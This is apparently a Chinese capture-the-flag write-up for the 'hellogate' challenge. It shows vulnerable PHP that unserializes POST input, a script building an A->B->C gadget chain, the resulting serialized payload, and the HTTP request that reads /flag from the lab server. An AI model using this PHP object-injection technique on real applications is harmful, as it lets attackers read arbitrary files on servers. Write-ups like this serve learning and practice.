# hellogate

bp抓包发送看raw最下面有源码

```php
<?php
error_reporting(0);
class A {
    public $handle;
    public function triggerMethod() {
        echo "" . $this->handle; 
    }
}
class B {
    public $worker;
    public $cmd;
    public function __toString() {
        return $this->worker->result;
    }
}
class C {
    public $cmd;
    public function __get($name) {
        echo file_get_contents($this->cmd);
    }
}
$raw = isset($_POST['data']) ? $_POST['data'] : '';
header('Content-Type: image/jpeg');
readfile("muzujijiji.jpg");
highlight_file(__FILE__);
$obj = unserialize($_POST['data']);
$obj->triggerMethod();
```

构造序列化代码

```php
<?php
error_reporting(0);
class A {
    public $handle;
}
class B {
    public $worker;
    public $cmd;
}
class C {
    public $cmd;
}
$cmd=new C();
$cmd->cmd='/flag';

$worker=new B();
$worker->worker=$cmd;

$a=new A();
$a->handle=$worker;
$data=serialize($a);
echo $data;
?
```

运行后获得payload：

```JSON
O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}s:3:"cmd";N;}}
```

抓包发送

```YAML
POST / HTTP/2
Host: eci-2zea6t9gzlm3apgsuq1v.cloudeci1.ichunqiu.com:80
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1764341253
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 115

data=O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}s:3:"cmd";N;}}
```

flag在最底下

![](https://bxs-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YTVlYTg5ZjRhY2FjZTEwNDRmMDYxYWU1ODcwY2FhYjNfUTJ6aXUyOXowYUF2SEtIbjM0YzJBNWVoV2tXOW9nbGpfVG9rZW46QXhia2JIWlY3b0tLSk54MkpEZmN1MWxFbjBjXzE3NjY4OTgxMDg6MTc2NjkwMTcwOF9WNA)
